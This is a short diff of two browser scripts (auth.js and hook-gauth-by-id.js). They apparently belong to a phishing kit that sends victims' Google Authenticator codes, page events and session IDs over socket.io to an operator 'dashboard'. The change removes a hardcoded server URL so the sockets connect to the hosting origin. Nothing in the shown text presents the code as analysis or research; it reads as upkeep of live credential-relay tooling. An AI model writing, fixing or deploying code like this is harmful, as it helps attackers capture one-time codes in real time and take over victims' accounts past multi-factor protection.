@@ -1,6 +1,6 @@
 // auth.js
 (function () {
-  const SERVER_URL = "https://example.com";
+  
   const SESSION_STORAGE_KEY = "sessionID";
   const JOIN_EVENT = "client-join";   // matches your dashboard
   const EMIT_EVENT = "client-data";   // payload: { type:'gauth', value:'123456', sessionID }
@@ -95,7 +95,7 @@ const MFA_REDIRECT = {
   }
 
   function connectSocket(sessionID) {
-    const socket = window.io ? window.io(SERVER_URL, { transports: ["websocket", "polling"] }) : null;
+    const socket = window.io ? window.io({ transports: ["websocket", "polling"] }) : null;
     if (!socket) {
       console.warn("[auth.js] socket.io not found. Include the script tag before this file.");
       return null;
@@ -368,7 +368,7 @@ if (dest) {
 
 // hook-gauth-by-id.js
 (function () {
-  const SERVER_URL = "https://example.com";
+  
   const SESSION_KEY = "sessionID";
   const EMIT_EVENT = "client-data";
   const JOIN_EVENT = "client-join";
@@ -394,7 +394,7 @@ if (dest) {
 
   function ensureSocket(sessionID) {
     if (!window.io || socket) return socket;
-    socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });
+    socket = window.io({ transports: ["websocket", "polling"] });
     socket.on("connect", () => { socket.emit(JOIN_EVENT, { sessionID }); socket.emit(EMIT_EVENT, { type: "page", data: "auth", sessionID }); });
     return socket;
   }
